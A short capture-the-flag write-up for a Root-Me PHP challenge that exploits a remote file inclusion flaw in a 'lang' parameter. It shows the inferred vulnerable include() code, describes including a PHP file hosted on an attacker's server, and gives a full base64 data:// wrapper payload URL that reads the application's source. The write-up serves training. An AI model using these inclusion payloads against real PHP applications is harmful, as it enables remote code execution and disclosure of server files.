You see that the language is requested by ?lang=... . Let's try ?lang=abcd, you have the following error:

```
Warning: include(abcd_lang.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch13/index.php on line 18 Warning: include(): Failed opening 'abcd_lang.php' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch13/index.php on line 18
```
There is certainly something like:

```
$lang = $_GET["lang"];
include($lang."_lang.php");
```

If you can host php file on a remote server, you can name one hack_lang.php. And then entern ?lang=yourwebsite/hack

This will remotely execute the php code present in the file of your server, and you will be able to print the flag.

If you do not have a server, or do not want to use one, you can get the fag by using PHP's data:// wrapper

For example, if you convert this code :

```
<?php
$code = file_get_contents('/challenge/web-serveur/ch13/index.php');
echo $code;
?>
```
 to base 64, you will obtain:
 ```
 PD9waHANCg0KJGNvZGUgPSBmaWxlX2dldF9jb250ZW50cygnL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDEzL2luZGV4LnBocCcpOw0KZWNobyAkY29kZTsNCg0KPz4=
 ```

Then, you can request the URL: http://challenge01.root-me.org/web-serveur/ch13/?lang=data://text/plain;base64,PD9waHANCg0KJGNvZGUgPSBmaWxlX2dldF9jb250ZW50cygnL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDEzL2luZGV4LnBocCcpOw0KZWNobyAkY29kZTsNCg0KPz4=


And you have the flag ! (in the source code)
